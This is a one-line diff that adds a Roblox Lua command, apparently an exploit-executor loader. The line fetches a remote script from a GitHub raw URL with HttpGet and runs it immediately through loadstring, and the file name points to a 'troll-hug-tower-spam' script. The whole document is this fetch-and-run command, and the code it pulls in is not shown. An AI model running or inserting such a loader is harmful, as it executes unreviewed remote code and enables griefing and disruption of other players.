@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/troll-hug-tower-spam4-jfkts2a6gq9a07.lua"))()
